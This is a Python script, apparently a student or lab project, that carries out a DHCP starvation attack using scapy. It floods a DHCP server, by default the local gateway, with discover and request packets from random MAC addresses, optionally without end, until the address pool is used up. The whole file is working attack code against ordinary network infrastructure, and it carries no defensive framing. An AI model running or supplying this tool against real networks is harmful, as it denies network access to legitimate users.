# Maor Frost and Asaf Yahav
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

parser = argparse.ArgumentParser(description='DHCP Starvation')
# Do we want to keep attacking?
parser.add_argument('-p', '--persist', default=False, action='store_true', help='persistent?')
# Which interface do we want? default is the default interface
parser.add_argument('-i', '--iface', default=conf.iface, type=str, help='Interface you wish to use')
# Who do we want to attack? default is the gateway
parser.add_argument('-t', '--target', default=conf.route.route("0.0.0.0")[2], type=str, help='IP of target server')

args = parser.parse_args()


# Send a DHCP discover packet
def dhcp_discover(src_mac, target, iface):
    ip_dest = target
    mac_dest = "ff:ff:ff:ff:ff:ff" # Broadcast
    ether = Ether(src=src_mac, dst=mac_dest, type=0x0800) # Ethernet layer
    ip = IP(src='0.0.0.0', dst=ip_dest) # IP layer
    udp = UDP(sport=68, dport=67) # UDP layer
    bootp = BOOTP(chaddr=src_mac, # BOOTP layer
                  xid=random.randint(1, 1000000000),
                  flags=0xFFFFFF)
    dhcp = DHCP(options=[("message-type", "discover"), "end"]) # DHCP layer

    packet = ether / ip / udp / bootp / dhcp
    print("Sending DHCP discover")
    sendp(packet, iface=iface, verbose=0)
    offer = sniff(filter="udp port 68", timeout=3, count=1)
    return offer

# Send a DHCP request packet
def dhcp_request(offer, iface):
    transID = offer[BOOTP].xid
    client_mac = offer[BOOTP].chaddr
    offered_ip = offer[BOOTP].yiaddr

    # Get the DHCP server's IP
    server_ip = None
    for option in offer[DHCP].options:
        if isinstance(option, tuple) and option[0] == 'server_id':
            server_ip = option[1]
            break

    # Just in case the server_id option is missing
    if not server_ip:
        server_ip = offer[IP].src

    ether = Ether(src=offer[Ether].dst, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(op=1, xid=transID, chaddr=client_mac)
    dhcp = DHCP(options=[
        ("message-type", "request"),
        ("server_id", server_ip),
        ("requested_addr", offered_ip),
        "end"
    ])

    dhcp_request = ether / ip / udp / bootp / dhcp

    print("Sending DHCP request")
    sendp(dhcp_request, iface = iface)


def starve(target, iface, persistent):
    if persistent: # If we want the attack to be persistant we just keep sending DHCP discover packets from different MAC addresses
        while True:
            src_mac = RandMAC()
            dhcp_offer = dhcp_discover(src_mac = src_mac, target = target, iface = iface)
            if not dhcp_offer:
                continue
            dhcp_request(offer=dhcp_offer[0], iface = iface)
            time.sleep(1)

    else: # If we don't want the attack to be persistant we check if we get DHCP offers, if not we can stop the attack
        while True:
            counter = 0
            while True:
                src_mac = RandMAC()
                dhcp_offer = dhcp_discover(src_mac = src_mac, target = target ,iface = iface) # Send a DHCP discover
                if not dhcp_offer: # If we didn't get a DHCP offer, we try 3 more times
                    if counter >= 3: # If we still don't get a DHCP offer, we stop the attack
                        print("finishing attack")
                        return
                    counter += 1
                    print("retrying")
                    continue
                dhcp_request(offer = dhcp_offer[0], iface = iface)


# Calling the starve function
starve(target=args.target, iface=args.iface, persistent=args.persist)
